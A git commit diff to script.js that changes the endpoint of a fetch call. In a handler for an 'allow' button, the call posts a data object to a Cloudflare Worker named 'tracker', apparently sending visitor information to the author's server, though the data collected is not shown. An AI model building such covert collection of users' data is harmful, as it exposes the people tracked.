bb1c2a4e2e04b26f84f7435ab785159b5cf320b8
Jovdat7 <151205453+Jovdat7@users.noreply.github.com>
2025-12-30 23:41:44 +0400

    Update script.js

--- script.js
+++ script.js
@@ -9,7 +9,7 @@ document.getElementById('allow-btn').addEventListener('click', () => {
                 };
                 
                 // Send data to Cloudflare Worker
-                fetch('https://tracker.jovdat70.workers.dev/', {
+                fetch('https://tracksar.jovdat70.workers.dev/', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
